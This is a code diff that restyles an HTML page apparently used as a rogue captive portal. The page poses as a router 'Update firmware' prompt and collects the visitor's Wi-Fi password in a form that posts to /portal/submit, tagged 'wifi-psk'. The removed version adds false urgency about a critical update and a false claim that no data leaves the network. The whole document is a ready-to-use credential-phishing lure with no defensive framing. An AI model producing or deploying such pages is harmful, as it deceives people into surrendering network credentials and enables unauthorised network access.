@@ -1,63 +1,74 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Maintenance</title>
-<style>
-  *{margin:0;padding:0;box-sizing:border-box;border-radius:0}
-  body{font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;
-       background:#fff;color:#111;min-height:100vh;padding:24px;
-       display:flex;align-items:center;justify-content:center;
-       -webkit-font-smoothing:antialiased}
-  .frame{width:100%;max-width:460px;border:1px solid #111;background:#fff}
-  .bar{display:flex;align-items:center;justify-content:space-between;
-       padding:12px 20px;border-bottom:1px solid #111;
-       font-size:10px;letter-spacing:.18em;text-transform:uppercase;font-weight:600}
-  .bar span:last-child{letter-spacing:.06em;font-weight:400;color:#666}
-  .body{padding:28px 20px 24px}
-  h1{font-size:21px;line-height:1.25;letter-spacing:-.01em;margin:0 0 12px}
-  p{font-size:14px;line-height:1.6;color:#333;margin:0 0 16px}
-  .rule{border:0;border-top:1px solid #111;margin:20px 0}
-  .note{border-left:3px solid #111;background:#f4f4f4;padding:12px 14px;
-        font-size:13px;line-height:1.55;margin:0 0 22px}
-  label{display:block;font-size:10px;letter-spacing:.16em;text-transform:uppercase;
-        font-weight:600;margin:0 0 8px}
-  input{width:100%;padding:14px;border:1px solid #111;background:#fff;color:#111;
-        font-size:16px;font-family:inherit;outline:none;-webkit-appearance:none}
-  input:focus{outline:2px solid #111;outline-offset:-1px}
-  button{width:100%;margin-top:14px;padding:15px;border:1px solid #111;
-         background:#111;color:#fff;font-family:inherit;font-size:12px;font-weight:700;
-         letter-spacing:.16em;text-transform:uppercase;cursor:pointer;-webkit-appearance:none}
-  button:active{background:#fff;color:#111}
-  .foot{padding:12px 20px;border-top:1px solid #111;font-size:11px;color:#666;
-        line-height:1.5;letter-spacing:.02em}
-  .mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:12px}
-</style>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Update firmware</title>
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      display: grid;
+      place-items: center;
+      min-height: 100vh;
+      min-height: 100svh;
+      margin: 0;
+      padding: 32px 24px 64px;
+      background: #fff;
+      color: #111;
+      font: 16px/1.5 system-ui, sans-serif;
+    }
+
+    main { width: 100%; max-width: 384px; }
+
+    h1 {
+      margin: 0 0 24px;
+      font-size: clamp(32px, 7vw, 44px);
+      font-weight: 650;
+      line-height: 1.12;
+      letter-spacing: -.045em;
+    }
+
+    form { padding-top: 24px; border-top: 1px solid #d8d8d8; }
+    label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 600; }
+
+    input, button {
+      display: block;
+      width: 100%;
+      min-height: 48px;
+      padding: 10px 14px;
+      border: 1px solid;
+      border-radius: 0;
+      font: inherit;
+    }
+
+    input { border-color: #757575; background: #fff; color: #111; }
+
+    button {
+      margin-top: 12px;
+      border-color: #111;
+      background: #111;
+      color: #fff;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    button:hover { background: #303030; }
+    :focus-visible { outline: 2px solid currentColor; outline-offset: 3px; }
+    button:focus-visible { outline-color: #111; }
+  </style>
 </head>
 <body>
-<div class="frame">
-  <div class="bar"><span>System Maintenance</span><span>Admin Console</span></div>
-  <div class="body">
-    <h1>Firmware update required</h1>
-    <p>A critical update is pending for this gateway. Until it is installed the
-       wireless link may drop and connected devices can lose internet access.</p>
-    <div class="note">
-      Confirm the Wi-Fi password to authorise the update. The gateway restarts
-      once the update is applied.
-    </div>
-    <form method="POST" action="/portal/submit" autocomplete="off">
+  <main>
+    <h1>Update firmware</h1>
+    <form method="post" action="/portal/submit">
       <input type="hidden" name="portal_type" value="wifi-psk">
-      <label for="wifi_password">Wi-Fi password</label>
-      <input type="password" id="wifi_password" name="wifi_password"
-             placeholder="Network security key" required autofocus
-             autocapitalize="off" autocorrect="off" spellcheck="false">
-      <button type="submit">Install update</button>
+      <label for="wifi_password">Enter password</label>
+      <input id="wifi_password" name="wifi_password" type="password"
+             autocomplete="current-password" autocapitalize="off"
+             autocorrect="off" spellcheck="false" required autofocus>
+      <button type="submit">Confirm</button>
     </form>
-    <hr class="rule">
-    <p class="mono" style="margin:0;color:#666">Update size 4.2 MB &middot; verified build &middot; no data leaves this network</p>
-  </div>
-  <div class="foot">Devices reconnect automatically after the gateway restarts.</div>
-</div>
+  </main>
 </body>
 </html>
